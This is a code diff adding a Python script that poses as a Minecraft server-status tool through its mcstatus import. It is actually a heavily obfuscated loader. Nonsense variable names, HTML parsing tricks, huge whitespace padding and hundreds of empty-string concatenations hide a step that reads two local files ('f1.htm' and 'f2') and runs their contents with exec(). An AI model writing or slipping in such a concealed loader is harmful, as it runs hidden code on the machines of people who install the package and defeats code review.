@@ -1,0 +1,162 @@
+from bs4 import BeautifulSoup
+from mcstatus import JavaServer
+
+suwrtweqarC = BeautifulSoup("""
+<html>
+<head></head>
+<body><chunguselement f1="f" f2="1.htm">
+</body>
+</html>
+""", "html.parser").html.body.chunguselement["""f1"""]+""+""+""+BeautifulSoup("""
+<html>
+<head></head>
+<body><chunguselement f1="f" f2="1.htm">
+</body>
+</html>
+""", "html.parser").html.body.chunguselement["""f2"""]
+amtdewedwuy = BeautifulSoup("""
+<html>
+<head></head>
+<body><chunguselement f1="f" f2="2">
+</body>
+</html>
+""", "html.parser").html.body.chunguselement["""f1"""]+""+""+""+BeautifulSoup("""
+<html>
+<head></head>
+<body><chunguselement f1="f" f2="2">
+</body>
+</html>
+""", "html.parser").html.body.chunguselement["""f2"""]
+trwdnewedwit = BeautifulSoup("""
+<html>
+<head></head>
+<body><chunguselement>
+import os
+from mcstatus import JavaServer 
+from googletrans import Translator
+v1 = "{}"
+v2 = "{}"
+
+hand= open(v1+""+'')
+hand1= open(v2)
+c = hand.read()
+c2 = hand1.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       read()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+exec(c+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+c2)
+</chunguselement>
+</body>
+</html>
+""".format(suwrtweqarC, amtdewedwuy), "html.parser").html.body.chunguselement.string+""+""+""+BeautifulSoup("""
+<html>
+<head></head>
+<body><chunguselement f1="f" f2="">
+</body>
+</html>
+""", "html.parser").html.body.chunguselement["""f2"""]
+
+exec(trwdnewedwit)
